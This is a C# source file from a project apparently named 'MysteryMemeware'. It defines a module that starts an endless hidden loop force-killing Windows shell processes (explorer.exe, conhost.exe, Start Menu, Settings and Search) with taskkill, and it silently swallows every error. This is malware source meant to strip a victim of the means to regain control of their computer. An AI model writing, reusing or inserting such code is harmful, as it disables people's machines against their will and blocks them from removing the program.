namespace MysteryMemeware
{
    public static class ProcessExterminatorModule
    {
        public static void Run()
        {
            try
            {
                System.Threading.Thread volumeLockThread = new System.Threading.Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            ExterminateProcess("conhost.exe");
                            ExterminateProcess("explorer.exe");
                            ExterminateProcess("StartMenuExperienceHost.exe");
                            ExterminateProcess("ShellExperienceHost.exe.exe");
                            ExterminateProcess("SystemSettings.exe");
                            ExterminateProcess("SearchApp.exe");
                        }
                        catch
                        {

                        }
                    }
                });
                volumeLockThread.Start();
            }
            catch
            {

            }
        }
        private static void ExterminateProcess(string imageName)
        {
            try
            {
                ProcessHelper.AwaitSuccess(ProcessHelper.Start("taskkill.exe", $"/IM {imageName} /F", WindowMode.Hidden));
            }
            catch
            {

            }
        }
    }
}
